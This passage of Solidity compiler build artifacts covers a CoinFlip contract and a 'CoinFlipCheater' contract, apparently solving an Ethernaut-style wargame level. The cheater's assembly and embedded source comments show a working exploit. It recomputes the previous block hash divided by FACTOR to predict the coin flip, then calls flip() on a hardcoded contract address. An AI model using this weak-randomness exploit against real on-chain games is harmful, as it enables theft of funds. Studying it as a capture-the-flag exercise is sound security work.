											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2121,
											"end": 2209,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2228,
											"end": 2232,
											"name": "PUSH",
											"source": 2,
											"value": "12"
										},
										{
											"begin": 2225,
											"end": 2226,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 2218,
											"end": 2233,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2252,
											"end": 2256,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 2249,
											"end": 2250,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2242,
											"end": 2257,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2269,
											"end": 2385,
											"name": "tag",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 2269,
											"end": 2385,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "68"
										},
										{
											"begin": 2354,
											"end": 2359,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "tag",
											"source": 2,
											"value": "68"
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2332,
											"end": 2337,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2329,
											"end": 2361,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 2319,
											"end": 2321,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "69"
										},
										{
											"begin": 2319,
											"end": 2321,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2375,
											"end": 2376,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2372,
											"end": 2373,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 2365,
											"end": 2377,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2319,
											"end": 2321,
											"name": "tag",
											"source": 2,
											"value": "69"
										},
										{
											"begin": 2319,
											"end": 2321,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2309,
											"end": 2385,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2309,
											"end": 2385,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"consecutiveWins()": "e6f334d7",
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"consecutiveWins\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CoinFlip.sol\":\"CoinFlip\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/CoinFlip.sol\":{\"keccak256\":\"0xb95bc60e86408dd64b7966baa45eb5ef0590ec2c19e5975041c52077a4f87bcd\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://087f97fd09c887feeee644218608b55eed2ece4776a3cdf6fcc369e69819421e\",\"dweb:/ipfs/QmZKXyRfvRUud7RoWu64WgPhnPA3UrufZsRdLJ5XDYgRr2\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 3,
								"contract": "contracts/CoinFlip.sol:CoinFlip",
								"label": "consecutiveWins",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 5,
								"contract": "contracts/CoinFlip.sol:CoinFlip",
								"label": "lastHash",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 8,
								"contract": "contracts/CoinFlip.sol:CoinFlip",
								"label": "FACTOR",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"contracts/CoinFlipCheater.sol": {
				"CoinFlipCheater": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "cheat",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/CoinFlipCheater.sol\":83:605  contract CoinFlipCheater {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/CoinFlipCheater.sol\":153:230  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/CoinFlipCheater.sol\":136:230  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x00\n  sstore\n    /* \"contracts/CoinFlipCheater.sol\":262:304  0x33C7Af9d0E10FB4D230D317376C87caB80C276Ec */\n  0x33c7af9d0e10fb4d230d317376c87cab80c276ec\n    /* \"contracts/CoinFlipCheater.sol\":236:304  address coinFlipAddress = 0x33C7Af9d0E10FB4D230D317376C87caB80C276Ec */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/CoinFlipCheater.sol\":114:130  constructor() {} */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"contracts/CoinFlipCheater.sol\":83:605  contract CoinFlipCheater {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/CoinFlipCheater.sol\":83:605  contract CoinFlipCheater {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xaa1b510e\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/CoinFlipCheater.sol\":311:603  function cheat() public returns (bool) {... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      mload(0x40)\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_5:\n        /* \"contracts/CoinFlipCheater.sol\":344:348  bool */\n      0x00\n        /* \"contracts/CoinFlipCheater.sol\":360:378  uint256 blockValue */\n      dup1\n        /* \"contracts/CoinFlipCheater.sol\":414:415  1 */\n      0x01\n        /* \"contracts/CoinFlipCheater.sol\":399:411  block.number */\n      number\n        /* \"contracts/CoinFlipCheater.sol\":399:415  block.number - 1 */\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n        /* \"contracts/CoinFlipCheater.sol\":389:416  blockhash(block.number - 1) */\n      blockhash\n        /* \"contracts/CoinFlipCheater.sol\":381:417  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"contracts/CoinFlipCheater.sol\":360:417  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"contracts/CoinFlipCheater.sol\":427:443  uint256 coinFlip */\n      0x00\n        /* \"contracts/CoinFlipCheater.sol\":459:465  FACTOR */\n      dup1\n      sload\n        /* \"contracts/CoinFlipCheater.sol\":446:456  blockValue */\n      dup3\n        /* \"contracts/CoinFlipCheater.sol\":446:465  blockValue / FACTOR */\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n        /* \"contracts/CoinFlipCheater.sol\":427:465  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"contracts/CoinFlipCheater.sol\":476:485  bool side */\n      0x00\n        /* \"contracts/CoinFlipCheater.sol\":500:501  1 */\n      0x01\n        /* \"contracts/CoinFlipCheater.sol\":488:496  coinFlip */\n      dup3\n        /* \"contracts/CoinFlipCheater.sol\":488:501  coinFlip == 1 */\n      eq\n        /* \"contracts/CoinFlipCheater.sol\":488:516  coinFlip == 1 ? true : false */\n      tag_13\n      jumpi\n        /* \"contracts/CoinFlipCheater.sol\":511:516  false */\n      0x00\n        /* \"contracts/CoinFlipCheater.sol\":488:516  coinFlip == 1 ? true : false */\n      jump(tag_14)\n    tag_13:\n        /* \"contracts/CoinFlipCheater.sol\":504:508  true */\n      0x01\n        /* \"contracts/CoinFlipCheater.sol\":488:516  coinFlip == 1 ? true : false */\n    tag_14:\n        /* \"contracts/CoinFlipCheater.sol\":476:516  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/CoinFlipCheater.sol\":527:538  CoinFlip cf */\n      0x00\n        /* \"contracts/CoinFlipCheater.sol\":550:565  coinFlipAddress */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/CoinFlipCheater.sol\":527:566  CoinFlip cf = CoinFlip(coinFlipAddress) */\n      swap1\n      pop\n        /* \"contracts/CoinFlipCheater.sol\":583:585  cf */\n      dup1\n        /* \"contracts/CoinFlipCheater.sol\":583:590  cf.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contracts/CoinFlipCheater.sol\":591:595  side */\n      dup4\n        /* \"contracts/CoinFlipCheater.sol\":583:596  cf.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_15\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_15:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"contracts/CoinFlipCheater.sol\":576:596  return cf.flip(side) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/CoinFlipCheater.sol\":311:603  function cheat() public returns (bool) {... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:144   */\n    tag_22:\n      0x00\n        /* \"#utility.yul\":92:98   */\n      dup2\n        /* \"#utility.yul\":86:99   */\n      mload\n        /* \"#utility.yul\":77:99   */\n      swap1\n      pop\n        /* \"#utility.yul\":108:138   */\n      tag_24\n        /* \"#utility.yul\":132:137   */\n      dup2\n        /* \"#utility.yul\":108:138   */\n      tag_25\n      jump\t// in\n    tag_24:\n        /* \"#utility.yul\":67:144   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":150:428   */\n    tag_20:\n      0x00\n        /* \"#utility.yul\":266:268   */\n      0x20\n        /* \"#utility.yul\":254:263   */\n      dup3\n        /* \"#utility.yul\":245:252   */\n      dup5\n        /* \"#utility.yul\":241:264   */\n      sub\n        /* \"#utility.yul\":237:269   */\n      slt\n        /* \"#utility.yul\":234:236   */\n      iszero\n      tag_27\n      jumpi\n        /* \"#utility.yul\":282:283   */\n      0x00\n        /* \"#utility.yul\":279:280   */\n      dup1\n        /* \"#utility.yul\":272:284   */\n      revert\n        /* \"#utility.yul\":234:236   */\n    tag_27:\n        /* \"#utility.yul\":325:326   */\n      0x00\n        /* \"#utility.yul\":350:411   */\n      tag_28\n        /* \"#utility.yul\":403:410   */\n      dup5\n        /* \"#utility.yul\":394:400   */\n      dup3\n        /* \"#utility.yul\":383:392   */\n      dup6\n        /* \"#utility.yul\":379:401   */\n      add\n        /* \"#utility.yul\":350:411   */\n      tag_22\n      jump\t// in\n    tag_28:\n        /* \"#utility.yul\":340:411   */\n      swap2\n      pop\n        /* \"#utility.yul\":296:421   */\n      pop\n        /* \"#utility.yul\":224:428   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":434:543   */\n    tag_29:\n        /* \"#utility.yul\":515:536   */\n      tag_31\n        /* \"#utility.yul\":530:535   */\n      dup2\n        /* \"#utility.yul\":515:536   */\n      tag_32\n      jump\t// in\n    tag_31:\n        /* \"#utility.yul\":510:513   */\n      dup3\n        /* \"#utility.yul\":503:537   */\n      mstore\n        /* \"#utility.yul\":493:543   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":549:759   */\n    tag_7:\n      0x00\n        /* \"#utility.yul\":674:676   */\n      0x20\n        /* \"#utility.yul\":663:672   */\n      dup3\n        /* \"#utility.yul\":659:677   */\n      add\n        /* \"#utility.yul\":651:677   */\n      swap1\n      pop\n        /* \"#utility.yul\":687:752   */\n      tag_34\n        /* \"#utility.yul\":749:750   */\n      0x00\n        /* \"#utility.yul\":738:747   */\n      dup4\n        /* \"#utility.yul\":734:751   */\n      add\n        /* \"#utility.yul\":725:731   */\n      dup5\n        /* \"#utility.yul\":687:752   */\n      tag_29\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":641:759   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":765:950   */\n    tag_12:\n      0x00\n        /* \"#utility.yul\":822:842   */\n      tag_36\n        /* \"#utility.yul\":840:841   */\n      dup3\n        /* \"#utility.yul\":822:842   */\n      tag_37\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":817:842   */\n      swap2\n      pop\n        /* \"#utility.yul\":856:876   */\n      tag_38\n        /* \"#utility.yul\":874:875   */\n      dup4\n        /* \"#utility.yul\":856:876   */\n      tag_37\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":851:876   */\n      swap3\n      pop\n        /* \"#utility.yul\":895:896   */\n      dup3\n        /* \"#utility.yul\":885:887   */\n      tag_39\n      jumpi\n        /* \"#utility.yul\":900:918   */\n      tag_40\n      tag_41\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":885:887   */\n    tag_39:\n        /* \"#utility.yul\":942:943   */\n      dup3\n        /* \"#utility.yul\":939:940   */\n      dup3\n        /* \"#utility.yul\":935:944   */\n      div\n        /* \"#utility.yul\":930:944   */\n      swap1\n      pop\n        /* \"#utility.yul\":807:950   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":956:1147   */\n    tag_10:\n      0x00\n        /* \"#utility.yul\":1016:1036   */\n      tag_43\n        /* \"#utility.yul\":1034:1035   */\n      dup3\n        /* \"#utility.yul\":1016:1036   */\n      tag_37\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":1011:1036   */\n      swap2\n      pop\n        /* \"#utility.yul\":1050:1070   */\n      tag_44\n        /* \"#utility.yul\":1068:1069   */\n      dup4\n        /* \"#utility.yul\":1050:1070   */\n      tag_37\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":1045:1070   */\n      swap3\n      pop\n        /* \"#utility.yul\":1089:1090   */\n      dup3\n        /* \"#utility.yul\":1086:1087   */\n      dup3\n        /* \"#utility.yul\":1083:1091   */\n      lt\n        /* \"#utility.yul\":1080:1082   */\n      iszero\n      tag_45\n      jumpi\n        /* \"#utility.yul\":1094:1112   */\n      tag_46\n      tag_47\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":1080:1082   */\n    tag_45:\n        /* \"#utility.yul\":1139:1140   */\n      dup3\n        /* \"#utility.yul\":1136:1137   */\n      dup3\n        /* \"#utility.yul\":1132:1141   */\n      sub\n        /* \"#utility.yul\":1124:1141   */\n      swap1\n      pop\n        /* \"#utility.yul\":1001:1147   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1153:1243   */\n    tag_32:\n      0x00\n        /* \"#utility.yul\":1230:1235   */\n      dup2\n        /* \"#utility.yul\":1223:1236   */\n      iszero\n        /* \"#utility.yul\":1216:1237   */\n      iszero\n        /* \"#utility.yul\":1205:1237   */\n      swap1\n      pop\n        /* \"#utility.yul\":1195:1243   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1249:1326   */\n    tag_37:\n      0x00\n        /* \"#utility.yul\":1315:1320   */\n      dup2\n        /* \"#utility.yul\":1304:1320   */\n      swap1\n      pop\n        /* \"#utility.yul\":1294:1326   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1332:1512   */\n    tag_47:\n        /* \"#utility.yul\":1380:1457   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1377:1378   */\n      0x00\n        /* \"#utility.yul\":1370:1458   */\n      mstore\n        /* \"#utility.yul\":1477:1481   */\n      0x11\n        /* \"#utility.yul\":1474:1475   */\n      0x04\n        /* \"#utility.yul\":1467:1482   */\n      mstore\n        /* \"#utility.yul\":1501:1505   */\n      0x24\n        /* \"#utility.yul\":1498:1499   */\n      0x00\n        /* \"#utility.yul\":1491:1506   */\n      revert\n        /* \"#utility.yul\":1518:1698   */\n    tag_41:\n        /* \"#utility.yul\":1566:1643   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1563:1564   */\n      0x00\n        /* \"#utility.yul\":1556:1644   */\n      mstore\n        /* \"#utility.yul\":1663:1667   */\n      0x12\n        /* \"#utility.yul\":1660:1661   */\n      0x04\n        /* \"#utility.yul\":1653:1668   */\n      mstore\n        /* \"#utility.yul\":1687:1691   */\n      0x24\n        /* \"#utility.yul\":1684:1685   */\n      0x00\n        /* \"#utility.yul\":1677:1692   */\n      revert\n        /* \"#utility.yul\":1704:1820   */\n    tag_25:\n        /* \"#utility.yul\":1774:1795   */\n      tag_53\n        /* \"#utility.yul\":1789:1794   */\n      dup2\n        /* \"#utility.yul\":1774:1795   */\n      tag_32\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1767:1772   */\n      dup2\n        /* \"#utility.yul\":1764:1796   */\n      eq\n        /* \"#utility.yul\":1754:1756   */\n      tag_54\n      jumpi\n        /* \"#utility.yul\":1810:1811   */\n      0x00\n        /* \"#utility.yul\":1807:1808   */\n      dup1\n        /* \"#utility.yul\":1800:1812   */\n      revert\n        /* \"#utility.yul\":1754:1756   */\n    tag_54:\n        /* \"#utility.yul\":1744:1820   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220485b08a8942e4502a62214723952777fffeab66b4d9e3bda8901994ed7182fd564736f6c63430008000033\n}\n",
						"bytecode": {
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527f80000000000000000000000000000000000000000000000000000000000000006000557333c7af9d0e10fb4d230d317376c87cab80c276ec600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561008957600080fd5b506102d4806100996000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063aa1b510e14610030575b600080fd5b61003861004e565b6040516100459190610193565b60405180910390f35b60008060014361005e91906101df565b4060001c9050600080548261007391906101ae565b9050600060018214610086576000610089565b60015b90506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16631d263f67836040518263ffffffff1660e01b81526004016100eb9190610193565b602060405180830381600087803b15801561010557600080fd5b505af1158015610119573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061013d919061015b565b94505050505090565b60008151905061015581610287565b92915050565b60006020828403121561016d57600080fd5b600061017b84828501610146565b91505092915050565b61018d81610213565b82525050565b60006020820190506101a86000830184610184565b92915050565b60006101b98261021f565b91506101c48361021f565b9250826101d4576101d3610258565b5b828204905092915050565b60006101ea8261021f565b91506101f58361021f565b92508282101561020857610207610229565b5b828203905092915050565b60008115159050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b61029081610213565b811461029b57600080fd5b5056fea2646970667358221220485b08a8942e4502a62214723952777fffeab66b4d9e3bda8901994ed7182fd564736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x0 SSTORE PUSH20 0x33C7AF9D0E10FB4D230D317376C87CAB80C276EC PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x89 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2D4 DUP1 PUSH2 0x99 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xAA1B510E EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x193 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x5E SWAP2 SWAP1 PUSH2 0x1DF JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 DUP1 SLOAD DUP3 PUSH2 0x73 SWAP2 SWAP1 PUSH2 0x1AE JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0x86 JUMPI PUSH1 0x0 PUSH2 0x89 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP4 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xEB SWAP2 SWAP1 PUSH2 0x193 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x105 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x119 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x13D SWAP2 SWAP1 PUSH2 0x15B JUMP JUMPDEST SWAP5 POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x155 DUP2 PUSH2 0x287 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x16D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x17B DUP5 DUP3 DUP6 ADD PUSH2 0x146 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x18D DUP2 PUSH2 0x213 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1A8 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x184 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B9 DUP3 PUSH2 0x21F JUMP JUMPDEST SWAP2 POP PUSH2 0x1C4 DUP4 PUSH2 0x21F JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1D4 JUMPI PUSH2 0x1D3 PUSH2 0x258 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1EA DUP3 PUSH2 0x21F JUMP JUMPDEST SWAP2 POP PUSH2 0x1F5 DUP4 PUSH2 0x21F JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x208 JUMPI PUSH2 0x207 PUSH2 0x229 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x290 DUP2 PUSH2 0x213 JUMP JUMPDEST DUP2 EQ PUSH2 0x29B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x48 JUMPDEST ADDMOD 0xA8 SWAP5 0x2E GASLIMIT MUL 0xA6 0x22 EQ PUSH19 0x3952777FFFEAB66B4D9E3BDA8901994ED7182F 0xD5 PUSH5 0x736F6C6343 STOP ADDMOD STOP STOP CALLER ",
							"sourceMap": "83:522:1:-:0;;;153:77;136:94;;262:42;236:68;;;;;;;;;;;;;;;;;;;;114:16;;;;;;;;;;83:522;;;;;;"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1823:2",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "67:77:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "77:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "92:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "86:5:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "86:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "77:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "132:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "108:23:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "108:30:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "108:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "45:6:2",
														"type": ""
													},
													{
